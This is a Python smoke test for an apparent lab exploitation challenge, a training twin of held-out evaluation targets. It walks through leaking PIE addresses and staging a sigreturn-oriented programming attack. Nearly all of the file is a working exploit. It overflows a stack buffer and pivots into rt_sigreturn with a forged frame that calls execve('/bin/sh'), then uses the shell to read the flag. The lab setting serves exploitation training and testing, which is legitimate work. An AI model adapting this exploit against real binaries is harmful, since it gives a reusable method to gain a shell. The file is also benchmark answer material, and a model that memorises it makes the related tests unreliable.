#!/usr/bin/env python3
"""Smoke test for srop_train (port 19995): sigreturn-oriented
programming on a PIE binary - leak the rt_sigreturn pivot and the
syscall gadget, leak the BSS staging buffer, forge one rt_sigreturn
frame (rax=59 execve, rdi=staging, rip=syscall). MR6 training twin -
the eval srop targets stay unseen.

The menu protocol ([l]eak [s]tack [f]orge [x]it, letters):
  1. l: the service prints "leak: sigreturn() at 0x... syscall() at
     0x... probe() at 0x..." - the PIE base falls out of the leaks.
  2. s: the service prints "stack: 0x..." - the staging buffer's
     address (the writable segment the frame's execve aims rdi at).
  3. f: the forge - the payload rides the byte-at-a-time read
     channel NUL-safe, the service memcpy-copies it over an 8-byte
     stack buffer, vuln returns into the pivot, the kernel restores
     the frame: execve("/bin/sh", NULL, NULL) - the shell cats the
     flag.

Success output:

  FLAG: FLAG{mr6_srop_train_rtframe}
"""

import os
import re
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = int(os.environ.get("SMOKE_PORT", 19995))

PAD = 16  # measured: the return slot sits at +16


def recv_until(s, needle, limit=8192, t=5.0):
    s.settimeout(t)
    data = b""
    while needle not in data and len(data) < limit:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError as e:
        print(
            f"SKIP: port {PORT} not listening ({e}); "
            "the lab stack is not running - deploy it and re-run"
        )
        return 0

    menu = recv_until(s, b"[x]it\n")
    print(f"[+] menu: {menu.decode(errors='replace').strip()}")

    # 1. leak: the two gadgets + probe - the PIE base falls out
    s.send(b"l\n")
    out = recv_until(s, b"probe() at 0x")
    text = out.decode(errors="replace")
    m = re.search(r"sigreturn\(\) at (0x[0-9a-f]+)", text)
    sigret = int(m.group(1), 16)
    m = re.search(r"syscall\(\) at (0x[0-9a-f]+)", text)
    syscall = int(m.group(1), 16)
    m = re.search(r"probe\(\) at (0x[0-9a-f]+)", text)
    probe = int(m.group(1), 16)
    print(f"[+] leak: sigreturn={sigret:#x} syscall={syscall:#x} probe={probe:#x}")
    # toolchain-independent checks: the deltas are compile-stable, the
    # absolute offsets shift with the lab container's gcc (the ORACLE
    # caveat): syscall sits right after sigreturn, probe follows.
    assert syscall - sigret == 0xA, "syscall gadget not right after sigreturn"
    assert probe - sigret == 0xD, "probe gadget not where expected"

    # 2. stack: the staging buffer's address (the writable segment)
    s.send(b"s\n")
    out = recv_until(s, b"stack: 0x")
    staging = int(re.search(r"stack: (0x[0-9a-f]+)", out.decode()).group(1), 16)
    print(f"[+] staging buffer at {staging:#x}")

    # 3. forge: pad + pivot + the 248-byte rt_sigreturn frame
    # (the kernel reads the frame from rsp right after the pivot: the
    # frame starts at payload offset 0x18, right after the pivot slot
    # at 0x10). The ucontext layout (amd64): uc_flags 0x00, uc_link
    # 0x08, uc_stack 0x10-0x20, r8..r15 0x28-0x60, rdi 0x68, rsi 0x70,
    # rbp 0x78, rbx 0x80, rdx 0x88, rax 0x90, rcx 0x98, rsp 0xA0, rip
    # 0xA8, eflags 0xB0, csgsfs 0xB8, err/trapno/oldmask/cr2/fpstate
    # 0xC0-0xE0, reserved 0xE8, sigmask 0xF0 - 248 bytes total.
    frame = bytearray(248)
    struct.pack_into("<Q", frame, 0x68, staging)  # rdi: "/bin/sh"
    struct.pack_into("<Q", frame, 0x90, 59)  # rax: execve
    struct.pack_into("<Q", frame, 0xA0, staging + 0x200)  # rsp: scratch
    struct.pack_into("<Q", frame, 0xA8, syscall)  # rip: bare syscall
    struct.pack_into("<Q", frame, 0xB0, 0x202)  # eflags
    struct.pack_into("<Q", frame, 0xB8, 0x2B0000000033)  # cs=0x33 ss=0x2b
    payload = (
        b"/bin/sh\x00" + b"\x00" * (PAD - 8) + struct.pack("<Q", sigret) + bytes(frame)
    )
    s.send(b"f\n")
    s.send(payload + b"\n")
    # the execve replaces the process with /bin/sh; the shell reads
    # its commands from the same socket: send the flag cat
    s.send(b"cat srop_train.flag\n")
    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass
    tail = out.strip()[-120:].decode(errors="replace")
    print(f"[+] output: {tail!r}")
    assert b"FLAG{mr6_srop_train_rtframe}" in out, "oracle flag missing"
    print("[+] srop_train SMOKE TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
